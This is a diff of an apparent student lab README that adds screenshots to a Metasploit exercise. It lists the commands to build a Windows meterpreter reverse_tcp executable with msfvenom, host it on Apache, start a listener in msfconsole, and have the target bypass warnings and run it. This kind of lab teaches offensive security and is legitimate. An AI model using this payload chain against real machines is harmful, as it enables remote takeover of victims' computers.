@@ -26,29 +26,36 @@ Open terminal and try execute some kali linux commands
 Find the attackers ip address using ifconfig
 ## OUTPUT:
 
+![WhatsApp Image 2025-11-19 at 23 48 35_35774df2](https://github.com/user-attachments/assets/48d45597-ae6e-4214-9723-c0d2f516d210)
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
+<img width="1920" height="412" alt="ss2" src="https://github.com/user-attachments/assets/46cc6410-a9d6-4c6a-98e3-0e586b488730" />
 
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
+
+![WhatsApp Image 2025-11-20 at 00 12 35_9a7bf51c](https://github.com/user-attachments/assets/97cf23ed-a4cf-4af5-8814-6793ae09bc8d)
 
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
 
+![WhatsApp Image 2025-11-20 at 00 24 04_0a220e5e](https://github.com/user-attachments/assets/187e974a-c416-4eb8-b676-ede37cfc60ed)
 
 Check the status of apache2
 ## OUTPUT:
 
-
+<img width="1023" height="135" alt="Screenshot 2025-11-20 001901" src="https://github.com/user-attachments/assets/3d588845-7191-42a9-a6df-27360733ef62" />
 
 Invoke msfconsole:
 ## OUTPUT:
+
+![WhatsApp Image 2025-11-20 at 00 06 10_cdaaff32](https://github.com/user-attachments/assets/00e922af-fe34-4c93-b8ff-1efee2c98ba5)
 
 
 
@@ -56,6 +63,7 @@ Invoke msfconsole:
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
 
+<img width="1266" height="685" alt="Screenshot 2025-11-19 190831" src="https://github.com/user-attachments/assets/9adf105e-e4b5-4fc9-9618-0d427b00f191" />
 
 
 Starting a command and control Server
@@ -64,6 +72,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 
 ## OUTPUT:
+<img width="1122" height="149" alt="Screenshot 2025-11-19 200029" src="https://github.com/user-attachments/assets/06e956bf-9c47-419f-97ce-6360cfe5fd06" />
 
 
 
@@ -71,17 +80,15 @@ set LHOST 0.0.0.0
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
-## OUTPUT:
-
-
-
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
+<img width="1178" height="375" alt="Screenshot 2025-11-19 202636" src="https://github.com/user-attachments/assets/8b632f10-a004-47b7-b642-b23268b5050d" />
 
 
 
 On kali/parrot give the command exploit
 ## OUTPUT:
+<img width="1023" height="135" alt="Screenshot 2025-11-20 001901" src="https://github.com/user-attachments/assets/7ea48d23-2d60-4f52-8292-dfa0fb1391c5" />
 
 
 
